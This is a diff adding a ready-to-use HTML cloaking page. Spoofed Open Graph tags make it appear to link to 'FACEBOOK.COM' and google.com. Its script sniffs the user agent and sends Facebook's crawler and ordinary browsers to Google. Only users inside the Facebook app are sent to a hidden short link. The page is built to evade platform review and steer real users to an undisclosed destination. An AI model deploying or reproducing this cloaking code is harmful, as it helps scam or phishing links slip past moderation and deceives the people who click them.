@@ -1,0 +1,118 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Welcome</title>
+
+    <meta property="og:title" content="FACEBOOK.COM">
+    <meta property="og:description" content="">
+    <meta property="og:image" content="https://s3.us-east-2.amazonaws.com/img-utils-conversions.pixelied.com/conversions/Sun-Aug-16-2026/6968f72f-7d1c-4cad-8800-4676c47423df/0b8bf578-ec64-4b6f-95f8-de882b6aa414.tiff">
+    <meta property="og:url" content="https://google.com">
+    <meta property="og:type" content="website">
+
+    <script>
+    document.addEventListener('DOMContentLoaded', function () {
+
+        /*
+         * =========================================================
+         * GET USER AGENT
+         * =========================================================
+         */
+
+        var ua = navigator.userAgent || "";
+        var uaLower = ua.toLowerCase();
+
+
+        /*
+         * =========================================================
+         * FACEBOOK CRAWLER / BOT DETECTION
+         * =========================================================
+         */
+
+        var isFacebookBot =
+            uaLower.indexOf('facebookexternalhit') !== -1 ||
+            uaLower.indexOf('facebot') !== -1;
+
+
+        /*
+         * =========================================================
+         * FACEBOOK APP DETECTION
+         * =========================================================
+         *
+         * Facebook's mobile app normally includes identifiers
+         * such as FBAN, FBAV, FB_IAB or FB4A in its User-Agent.
+         *
+         * IMPORTANT:
+         * We are NOT checking:
+         * - screen size
+         * - Android
+         * - iPhone
+         * - mobile
+         * - tablet
+         *
+         * Therefore normal mobile browsers will NOT be sent
+         * to the main destination.
+         */
+
+        var isFacebookApp =
+            uaLower.indexOf('fban') !== -1 ||
+            uaLower.indexOf('fbav') !== -1 ||
+            uaLower.indexOf('fb_iab') !== -1 ||
+            uaLower.indexOf('fb4a') !== -1 ||
+            uaLower.indexOf('fbios') !== -1;
+
+
+        /*
+         * =========================================================
+         * REDIRECT
+         * =========================================================
+         */
+
+        if (isFacebookBot) {
+
+            /*
+             * Facebook crawler/bot
+             * Send to Google
+             */
+            window.location.replace("https://www.google.com");
+
+        } else if (isFacebookApp) {
+
+            /*
+             * REAL FACEBOOK APP
+             * Send to MAIN DESTINATION
+             */
+            window.location.replace("https://t.co/X3tbhjym8X");
+
+        } else {
+
+            /*
+             * EVERYTHING ELSE
+             *
+             * Desktop Chrome
+             * Desktop Edge
+             * Desktop Firefox
+             * Desktop Safari
+             * Android Chrome
+             * Android Firefox
+             * iPhone Safari
+             * iPhone Chrome
+             * Other browsers
+             * Other apps
+             *
+             * All go to Google.
+             */
+            window.location.replace("https://www.google.com");
+
+        }
+
+    });
+    </script>
+
+</head>
+
+<body>
+</body>
+</html>
